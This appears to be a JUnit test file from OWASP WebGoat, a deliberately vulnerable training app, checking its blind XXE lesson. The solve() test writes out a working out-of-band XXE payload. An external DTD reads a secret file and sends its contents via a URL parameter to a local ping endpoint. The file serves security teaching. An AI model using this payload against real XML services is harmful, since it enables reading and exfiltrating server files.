package org.owasp.webgoat.plugin;

import com.google.common.io.Files;
import org.hamcrest.CoreMatchers;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.owasp.webgoat.plugins.LessonTest;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.result.MockMvcResultHandlers;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import java.io.File;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * @author nbaars
 * @since 5/4/17.
 */
@RunWith(SpringJUnit4ClassRunner.class)
public class BlindSendFileAssignmentTest extends LessonTest {

    @Autowired
    private Comments comments;
    @Value("${webgoat.user.directory}")
    private String webGoatHomeDirectory;

    @Before
    public void setup() throws Exception {
        XXE xxe = new XXE();
        when(webSession.getCurrentLesson()).thenReturn(xxe);
        this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build();
        File logFile = new File(webGoatHomeDirectory, "/XXE/log" + webSession.getUserName() + ".txt");
        if (logFile.exists()) logFile.delete();
        when(webSession.getUserName()).thenReturn("unit-test");
    }

    @Test
    public void validCommentMustBeAdded() throws Exception {
        int nrOfComments = comments.getComments().size();
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                .content("<comment><text>test</text></comment>"))
                .andDo(MockMvcResultHandlers.print())
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
        assertThat(comments.getComments().size()).isEqualTo(nrOfComments + 1);
    }

    @Test
    public void wrongXmlShouldGiveErrorBack() throws Exception {
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                .content("<comment><text>test</ext></comment>"))
                .andDo(MockMvcResultHandlers.print())
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))))
                .andExpect(jsonPath("$.output", CoreMatchers.is("javax.xml.bind.UnmarshalException\\n - with linked exception:\\n[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,22]\\nMessage: The element type \\\"text\\\" must be terminated by the matching end-tag \\\"<\\/text>\\\".]")));
    }

    @Test
    public void solve() throws Exception {
        File file = new File(webGoatHomeDirectory, "XXE/attack.dtd");
        String dtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!ENTITY % file SYSTEM \"file:///" + webGoatHomeDirectory + "/XXE/secret.txt\">\n" +
                "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + localPort + "/WebGoat/XXE/ping?text=%file;'>\">\n" +
                "%all;";
        Files.write(dtd.getBytes(), file);
        String xml = "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE root [\n" +
                "<!ENTITY % remote SYSTEM \"file://" + file.getAbsolutePath() + "\">\n" +
                "%remote;\n" +
                "]>\n" +
                "<comment>\n" +
                "  <text>test&send;</text>\n" +
                "</comment>";
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                .content(xml))
                .andDo(MockMvcResultHandlers.print())
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.solved"))))
                .andExpect(jsonPath("$.output", CoreMatchers.containsString("WebGoat 8 rocks...")));
    }

}